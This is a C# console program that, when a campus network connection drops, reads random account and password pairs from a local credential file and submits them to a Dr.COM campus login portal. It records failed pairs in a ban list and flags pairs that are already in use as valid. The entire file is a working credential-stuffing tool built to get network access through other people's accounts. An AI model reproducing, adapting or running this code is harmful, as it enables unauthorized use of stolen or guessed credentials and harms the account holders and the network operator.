using System;
using RestSharp;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;//暂停
using System.IO;//文件读取
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;

namespace dotnet
{
    class Program
    {
        static bool isFiretLoad = true;
        static readonly string ListenHost = "www.bing.com.cn";
        static StreamReader sr;
        static StreamReader sfw;
        static readonly string BanListFilePath = Path.GetFullPath(Environment.CurrentDirectory + "/Resources/BanList.data");//黑名单路径
        static readonly string filename = Path.GetFullPath(Environment.CurrentDirectory + "/Resources/UidPwd.data");//白名单路径
        static Random rd = new Random();
        static void Main(string[] args)
        {
            Console.WriteLine("==============WELCOME==============");
            Console.WriteLine("第一次运行检查是否连接校园网，和是否网络正常。");
            Listen(ListenHost);//监听
        }

        private static void Listen(string ListenHost)//心跳
        {
            try
            {
                Ping ping = new Ping();
                PingReply pingReply = ping.Send(ListenHost);
                StringBuilder sbuilder;
                if (pingReply.Status == IPStatus.Success)
                {
                    sbuilder = new StringBuilder();
                    sbuilder.AppendLine(string.Format("延时: {0} ", pingReply.RoundtripTime));
                    sbuilder.AppendLine(string.Format("存活时间: {0} ", pingReply.Options.Ttl));
                    Console.WriteLine(sbuilder.ToString());
                    Thread.Sleep(3000);
                    Listen(ListenHost);
                }
                else if (pingReply.Status == IPStatus.TimedOut)//超时
                {
                    Console.WriteLine("请求超时，正在重试");         
                    int seed = rd.Next(1,200);//设置随机行数
                    Thread.Sleep(2000);
                    bool isSeame = false;
                    if (isFiretLoad)//首次加载
                    {
                        sr = File.OpenText(filename);//读取文件                   
                        isFiretLoad = false;
                    }
                    sfw = File.OpenText(BanListFilePath);
                    string nextline;
                    int i = 0;
                    while ((nextline = sr.ReadLine()) != null)//读取一排数据
                    {
                        i++;
                        if (i == seed)//读取随机中的行数
                        {
                            string banlist;

                            while ((banlist = sfw.ReadLine()) != null)//查看黑名单
                            {
                                if (nextline == banlist)//对上黑名单
                                {
                                    Console.WriteLine("该账号存在与黑名单中:" + nextline);
                                    isSeame = true;
                                    break;
                                }
                            }
                            if (isSeame)
                            {
                                seed = rd.Next(1,500);
                                isSeame = false;
                                continue;
                            }
                            sfw.Close();//关闭黑名单流
                            Console.WriteLine("=====================");
                            Console.WriteLine("正在尝试：");
                            Console.WriteLine(nextline);
                            Console.WriteLine();
                            string[] str = nextline.Split(' ');//空格分开密码账号
                            Login(str[0], str[1]);
                        }
                        continue;
                    }
                }
                else
                {
                    Console.WriteLine("失败");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("你多半是没连接CQCFE或者是没接上校园宽带？？？？？？"+ex.Message);
                throw ex;
            }
           
        }

        public static void Login(string uid, string pwd)//登录方法
        {
            try
            {
                var client = new RestClient("http://172.16.0.2/drcom");//使用RestSharp实现
                var request = new RestRequest(string.Format("login?callback=dr1003&DDDDD={0}%40cmcc&upass={1}&0MKKey=123456&R1=0&R3=0&R6=0&para=00&v6ip=&v=7051", uid, pwd), DataFormat.Json);
                var response = client.Get(request);
                var jcode = Regex.Replace(response.Content, @"(.*\()(.*)(\).*)", "$2"); //去掉小括号()
                var result = JsonConvert.DeserializeObject<JObject>(jcode.ToString());
                if (result["result"].ToString() == "1")//登录成功
                {
                    Console.WriteLine("登录成功");
                }
                else if (result["result"].ToString() == "0")//登录失败
                {
                    Console.WriteLine("登录失败正在寻找原因");
                    if (result["msga"].ToString() == "inuse, login again")//重复登录
                    {
                        Console.WriteLine("===========================");
                        Console.WriteLine("正确的账号信息,该账号将不会进入黑名单");
                        Console.WriteLine(result["uid"].ToString());
                        Listen(ListenHost);
                    }
                    else//登录失败把ID加入黑名单
                    {
                        Console.WriteLine("用户名或者密码问题,该条记录会被加入黑名单");
                        using StreamWriter sw = new StreamWriter(BanListFilePath, true);
                        string content = uid + " " + pwd;
                        sw.WriteLine(content);
                        sw.Close();
                        Listen(ListenHost);
                    }
                }
                Listen(ListenHost);
            }
            catch (Exception)
            {
                Console.WriteLine("出问题了哎");
            }
            
        }
    }
}
